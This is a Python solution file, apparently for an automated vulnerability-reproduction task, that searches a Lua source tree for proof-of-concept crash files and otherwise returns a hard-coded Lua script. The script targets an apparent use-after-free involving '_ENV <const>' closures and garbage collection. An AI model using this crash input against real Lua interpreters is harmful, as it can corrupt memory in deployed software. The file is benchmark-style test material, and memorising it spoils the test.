import os
import tarfile


class Solution:
    EXACT_SIZE = 1181

    def solve(self, src_path: str) -> bytes:
        poc = None
        if src_path and os.path.isfile(src_path):
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    poc = self._scan_tar(tf)
            except tarfile.TarError:
                poc = None
        if poc is None and src_path and os.path.isdir(src_path):
            poc = self._scan_dir(src_path)
        if poc is None:
            poc = self._fallback_poc()
        return poc

    def _scan_tar(self, tf) -> bytes:
        def iter_files():
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                size = m.size
                path = m.name

                def read_func(m=m, tf=tf):
                    f = tf.extractfile(m)
                    if f is None:
                        return None
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    return data

                yield path, size, read_func

        return self._find_poc_in_files(iter_files())

    def _scan_dir(self, root) -> bytes:
        def iter_files():
            for dirpath, _, filenames in os.walk(root):
                for fname in filenames:
                    full = os.path.join(dirpath, fname)
                    try:
                        size = os.path.getsize(full)
                    except OSError:
                        continue

                    def read_func(full=full):
                        try:
                            with open(full, 'rb') as f:
                                return f.read()
                        except OSError:
                            return None

                    yield full, size, read_func

        return self._find_poc_in_files(iter_files())

    def _find_poc_in_files(self, file_iter) -> bytes:
        exact = self.EXACT_SIZE
        best_poc = None
        best_poc_score = None
        best_lua_env_const = None
        best_lua_env_const_score = None
        best_exact = None
        best_any_lua = None

        for path, size, read_func in file_iter:
            if size <= 0:
                continue
            if size > 200000:
                continue

            path_lower = path.lower()
            ext = os.path.splitext(path_lower)[1]
            is_lua = ext == ".lua"

            need_content = False
            want_for_exact = False

            if is_lua and size <= 50000:
                need_content = True

            keyword = ('poc' in path_lower) or ('crash' in path_lower) or ('uaf' in path_lower)
            if keyword and size <= 10000:
                need_content = True

            if size == exact and best_exact is None:
                need_content = True
                want_for_exact = True

            content = None
            if need_content:
                content = read_func()
                if content is None:
                    continue
                if want_for_exact and best_exact is None:
                    best_exact = content

            if content is not None and keyword and size <= 10000:
                score = 0
                if 'poc' in path_lower:
                    score += 3
                if 'crash' in path_lower:
                    score += 2
                if 'uaf' in path_lower:
                    score += 1
                score = score * 100000 - abs(size - exact)
                if best_poc_score is None or score > best_poc_score:
                    best_poc_score = score
                    best_poc = content

            if content is not None and is_lua and size <= 50000:
                if (b'_ENV' in content or b'_env' in content) and b'<const>' in content:
                    score = -abs(size - exact)
                    if best_lua_env_const_score is None or score > best_lua_env_const_score:
                        best_lua_env_const_score = score
                        best_lua_env_const = content
                if best_any_lua is None and size <= 10000:
                    best_any_lua = content

        if best_poc is not None:
            return best_poc
        if best_lua_env_const is not None:
            return best_lua_env_const
        if best_exact is not None:
            return best_exact
        if best_any_lua is not None:
            return best_any_lua
        return None

    def _fallback_poc(self) -> bytes:
        lua_src = r'''
local chunks = {}

chunks[1] = [[
local _ENV <const> = { x = 1 }
local function mk()
  local function inner()
    return x
  end
  return inner
end
local f = mk()
collectgarbage()
f()
]]

chunks[2] = [[
do
  local _ENV <const> = { y = 2 }
  local function outer()
    local k = y
    local function inner()
      return k, y
    end
    return inner
  end
  local g = outer()
  collectgarbage()
  g()
end
]]

chunks[3] = [[
do
  local function factory(envval)
    local _ENV <const> = { z = envval }
    local function inner()
      return z
    end
    return inner
  end
  local list = {}
  for i = 1, 10 do
    list[i] = factory(i)
  end
  collectgarbage()
  for i = 1, 10 do
    list[i]()
  end
end
]]

chunks[4] = [[
do
  local src = [[
    local _ENV <const> = { v = ... }
    local function f()
      local function g()
        return v
      end
      return g
    end
    local h = f()
    collectgarbage()
    return h()
  ]]
  local f = assert(load(src, "chunk4", "t", {}))
  f(42)
end
]]

local function run_chunk(src)
  pcall(function()
    local f = assert(load(src, "poc", "t"))
    f()
  end)
end

for i = 1, #chunks do
  run_chunk(chunks[i])
end

local function stress()
  for i = 1, 50 do
    local src = "do local _ENV <const> = { a = " .. i .. " } " ..
                "local function f() " ..
                "local function g() return a end " ..
                "return g end " ..
                "local h = f(); " ..
                "collectgarbage(); " ..
                "h() end"
    run_chunk(src)
  end
end

stress()
'''
        return lua_src.encode('utf-8')